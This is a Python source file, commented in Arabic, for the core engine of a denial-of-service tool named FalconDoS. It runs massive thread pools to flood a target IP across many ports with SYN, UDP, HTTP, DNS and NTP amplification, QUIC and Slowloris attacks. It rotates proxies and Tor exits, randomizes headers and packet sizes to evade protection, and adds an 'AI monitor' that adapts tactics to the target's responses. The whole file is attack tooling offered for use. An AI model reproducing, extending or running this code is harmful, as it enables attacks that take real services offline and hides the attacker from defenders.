# core/attack_engine.py
"""
attack_engine.py
----------------
المحرك الرئيسي لهجمات FalconDoS. 
يدير توزيع الهجوم على عدة بروتوكولات ومنافذ،
يدمج مع وحدات التخفّي (header_mutator, proxy_rotator) ويستخدم الذكاء الصناعي لتعديل الهجوم.

المميزات:
- Multi-Port: دعم ضرب عدة منافذ في نفس الوقت
- Multi-Protocol: دعم بروتوكولات متعددة بالتوازي (TCP SYN, UDP, HTTP, DNS Amplification, ...)
- IP Rotation: يدعم تغيير الـ IP ديناميكياً عبر وحدات التخفي
- Dynamic Packet Size: توليد أحجام حزم عشوائية لتجاوز الحماية
- Threaded & Async: لتحقيق أقصى سرعة وأداء
"""

import threading
import random
import time
from protocols import tcp_syn, udp_flood, http_flood, dns_amp, ntp_amp, quic_flood, slowloris
from stealth import header_mutator, proxy_rotator
from core import ai_analyzer

class AttackEngine:
    def __init__(self, target_ip, ports, protocols, threads_per_port=1000, duration=60):
        self.target_ip = target_ip
        self.ports = ports if isinstance(ports, list) else [ports]
        self.protocols = protocols  # قائمة البروتوكولات المختارة مثل ["TCP", "HTTP", "UDP"]
        self.threads_per_port = threads_per_port
        self.duration = duration
        self.threads = []
        self.running = True

    def start(self):
        """
        تبدأ الهجوم بتشغيل عدد threads لكل منفذ ولكل بروتوكول.
        """
        print(f"[INFO] بدء الهجوم على {self.target_ip} المنافذ: {self.ports} البروتوكولات: {self.protocols}")

        # لكل منفذ وبروتوكول، أنشئ Threads
        for port in self.ports:
            for protocol in self.protocols:
                for _ in range(self.threads_per_port):
                    t = threading.Thread(target=self.attack_runner, args=(protocol, port))
                    t.daemon = True  # يسمح بالخروج مع انتهاء البرنامج
                    t.start()
                    self.threads.append(t)

        # تشغيل مراقب الذكاء الاصطناعي لتعديل الهجوم تلقائيًا
        ai_thread = threading.Thread(target=self.ai_monitor)
        ai_thread.daemon = True
        ai_thread.start()

        # استمر بالهجوم لمدة معينة
        time.sleep(self.duration)
        self.running = False

        # انتظار انتهاء كل الخيوط
        for t in self.threads:
            t.join(timeout=1)

        print("[INFO] انتهى الهجوم.")

    def attack_runner(self, protocol, port):
        """
        الدالة التي ينفذها كل Thread، وتبدأ الهجوم بناءً على البروتوكول.
        """
        while self.running:
            # توليد رؤوس عشوائية HTTP لتخفي الهجوم (يتم استخدامها فقط في HTTP)
            headers = header_mutator.random_headers() if protocol == "HTTP" else {}

            # اختيار IP عبر بروكسي أو تور بشكل عشوائي لتغيير المصدر
            ip_source = proxy_rotator.get_random_proxy()

            # اختيار حجم الحزمة عشوائي من 512 إلى 4096 بايت
            packet_size = random.randint(512, 4096)

            # استدعاء الهجوم المناسب لكل بروتوكول
            if protocol == "TCP":
                tcp_syn.attack(self.target_ip, port, packet_size, ip_source)
            elif protocol == "UDP":
                udp_flood.attack(self.target_ip, port, packet_size, ip_source)
            elif protocol == "HTTP":
                http_flood.attack(self.target_ip, port, headers, ip_source)
            elif protocol == "DNS_AMP":
                dns_amp.attack(self.target_ip, port, packet_size, ip_source)
            elif protocol == "NTP_AMP":
                ntp_amp.attack(self.target_ip, port, packet_size, ip_source)
            elif protocol == "QUIC":
                quic_flood.attack(self.target_ip, port, headers, ip_source)
            elif protocol == "SLOWLORIS":
                slowloris.attack(self.target_ip, port, headers, ip_source)

            # ضف تأخير صغير (قابل للتعديل) لتوزيع الحزم بدون توقف كامل
            time.sleep(0.001)

    def ai_monitor(self):
        """
        مراقب الذكاء الاصطناعي: 
        يراقب ردود الخوادم باستمرار لتغيير تكتيكات الهجوم ديناميكياً،
        كالتبديل بين البروتوكولات أو تقليل الضغط على المنافذ المحجوبة.
        """
        while self.running:
            # هنا يتم جمع البيانات من ردود السيرفر وتحليلها
            # مثال مبسط: استدعاء وحدة ai_analyzer لتحليل الردود
            change_needed = ai_analyzer.analyze(self.target_ip)

            if change_needed:
                print("[AI] تعديل استراتيجية الهجوم بناءً على ردود الهدف.")
                # يمكن هنا تطبيق تعديلات ذكية، مثل تقليل عدد threads على منافذ معينة
                # أو تبديل البروتوكولات المستعملة، أو تغيير رؤوس HTTP الخ.

            time.sleep(5)  # تحقق كل 5 ثواني

